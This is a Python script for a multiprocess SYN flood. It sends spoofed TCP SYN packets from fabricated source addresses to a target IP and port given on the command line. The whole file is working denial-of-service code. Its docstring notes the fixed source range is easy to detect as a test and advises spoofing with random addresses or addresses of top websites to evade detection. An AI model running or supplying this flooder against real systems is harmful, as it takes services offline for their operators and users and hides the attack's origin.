""" ezSYN FLOOD MULTIPROCESS.

Usage:
  ezSYN_FLOOD_MULTIPROCESS.py <dst_ip> <dst_port> [--no-spoof] [--workers=<amount>] [--sleep=<seconds>]

Options:
  -h, --help            Show options.
  --version             Version.
  --workers=<amount>    How many processes to fire [default: 4].
  --sleep=<seconds>     How many seconds to sleep between shots [default: 0].

Workers will have addresses looking like 15.15.X.Y
X will be the number of the worker so worker number 1 will be firing from 15.15.1.Y
Y will be iterating from 1 to 254 so every workers fires around 250 shots fro 250 different addresses all in the same range (to be easily detected as a test)
If you wish to use a better spoofing mechanism please make sure the source ip address (15.15.X.Y) is completely randomly generated or sourced from actual top 3000 websites (alexa)

"""

from docopt import docopt
import logging
import sys
from multiprocessing import Process, current_process
import signal
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


def flood(src_net: str, dst_ip: str, dst_port: int, sleep: int, spoof_ip=True):
    # the actual code that will be sending SYN packets
    for src_host in range(1, 254):
        for src_port in range(1024, 65535):
            # Build the packet
            src_ip = "{src_net}.{src_host}".format(src_net=src_net, src_host=src_host)
            network_layer = IP(src=src_ip, dst=dst_ip) if spoof_ip else \
                    IP(dst=dst_ip)
            transport_layer = TCP(sport=src_port, dport=dst_port, flags="S")

            # Send the packet
            try:
                send(network_layer/transport_layer, verbose=False)
            except Exception as e:
                print("[-] Something went terribly wrong: {e}".format(e=e))
                sys.exit()

            if sleep != 0:
                time.sleep(sleep)


def signal_handler(signal, frame):
    print("\n[-] CTRL+C, quiting...")
    sys.exit(0)


def main(arguments):
    dst_ip = arguments["<dst_ip>"]
    dst_port = int(arguments["<dst_port>"])
    workers = int(arguments["--workers"])
    sleep = int(arguments["--sleep"])
    spoof = not arguments["--no-spoof"]

    signal.signal(signal.SIGINT, signal_handler)

    if workers < 1:
        print("[-] You need at least 1 worker to shoot for you at the target...")
        sys.exit()

    print("[!] Starting ez SYN MULTIPROCESS Flooder...")
    print("[~] Our Workers: {workers}".format(workers=workers))
    print("[~] Our Target: {dst_ip}".format(dst_ip=dst_ip))

    processes = []
    for worker in range(1, workers+1):
        src_net = "15.15.{worker}".format(worker=worker)
        p = Process(target=flood, args=(src_net, dst_ip, dst_port, sleep, spoof), daemon=True)
        processes.append(p)
        p.start()

    for process in processes:
        if process is not None:
            process.join()



if __name__ == "__main__":
    arguments = docopt(__doc__, version="ezSYN_FLOOD_MULTIPROCESS v1.0")
    main(arguments)
